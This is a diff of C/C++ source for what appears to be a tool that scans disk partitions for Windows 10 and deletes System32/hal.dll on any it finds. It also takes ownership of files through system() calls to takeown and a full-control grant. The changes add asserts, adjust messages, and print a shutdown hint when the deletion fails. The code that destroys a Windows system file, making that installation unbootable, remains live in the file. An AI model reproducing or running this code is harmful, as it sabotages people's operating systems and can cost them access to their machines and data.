@@ -18,7 +18,7 @@
 #include <sys/stat.h>
 #endif
 
-#define DEBUG 1
+// #define DEBUG 1
 #ifdef DEBUG
 #define print printf
 #else
@@ -91,6 +91,7 @@ static bool GetSystem[[maybe_unused]](AccessLevel& program, const char* file) {
   strcat(takeown, " /A");
   print("Executing: %s\n", takeown);
   strcat(takeown, ">nul 2>&1");
+  assert(strlen(takeown) + 1 == strlen(file) + 24);
   system(takeown);
   delete takeown;
 
@@ -103,6 +104,7 @@ static bool GetSystem[[maybe_unused]](AccessLevel& program, const char* file) {
     strcat(grant, " /GRANT Administradores:F");
   print("Executing: %s\n", grant);
   strcat(grant, ">nul 2>&1");
+  assert(strlen(grant) + 1 <= strlen(file) + 42);
   system(grant);
   delete(grant);
 
@@ -160,17 +162,24 @@ void MountedSearch() {
     char* name = new char[strlen(source) + 28];
     strcpy(name, source);
     strcat(name, "/Windows/System32/D3D12.dll");
+    assert(strlen(name) + 1 == strlen(source) + 28);
     print("Looking for file: %s\n", name);
 
     struct stat buffer;
     if (stat(name, &buffer) == 0) {
-      print(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
+      print(RED "ERROR: Windows 10 detected in partition: " NORMAL "%s\n", drive);
       char* del = new char[strlen(source) + 26];
       strcpy(del, source);
       strcat(del, "/Windows/System32/hal.dll");
+      assert(strlen(del) + 1 == strlen(source) + 26);
       print("Deleting %s ...\n", del);
       if (remove(del) == 0)
-        print(GREEN "INFO: File successfully deleted" NORMAL " \n");
+        print(GREEN "INFO: File successfully deleted" NORMAL "\n");
+      if (stat(del, &buffer) == 0) {
+        printf(RED "ERROR: Read-Only filesystem in: " NORMAL "/dev/%s\n", drive);
+        printf(GREEN "INFO: Execute: " BLUE "shutdown /s /t 0");
+        printf(GREEN " from Windows to turn it off." NORMAL "\n");
+      }
       delete del;
     }
     delete name;
@@ -211,7 +220,7 @@ void UnmountedSearch() {
     fclose(media);
     remove("media");
     if (mounted != 2) {
-      print(RED "WARNING: drive %s not mountable or already mounted." NORMAL " \n\n", drive);
+      print(RED "WARNING: drive %s not mountable or already mounted." NORMAL "\n\n", drive);
       continue;
     }
 
@@ -226,13 +235,19 @@ void UnmountedSearch() {
 
     struct stat buffer;
     if (stat(name, &buffer) == 0) {
-      print(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
+      print(RED "ERROR: Windows 10 detected in partition: " NORMAL "%s\n", drive);
       char* del = new char[strlen(source) + 26];
       strcpy(del, source);
       strcat(del, "/Windows/System32/hal.dll");
+      assert(strlen(del) + 1 == strlen(source) + 26);
       print("Deleting %s ...\n", del);
       if (remove(del) == 0)
-        print(GREEN "INFO: File successfully deleted" NORMAL " \n");
+        print(GREEN "INFO: File successfully deleted" NORMAL "\n");
+      if (stat(del, &buffer) == 0) {
+        printf(RED "ERROR: Read-Only filesystem in: " NORMAL "/dev/%s\n", drive);
+        printf(GREEN "INFO: Execute: " BLUE "shutdown /s /t 0");
+        printf(GREEN " from Windows to turn it off." NORMAL "\n");
+      }
       delete del;
     }
     delete name;
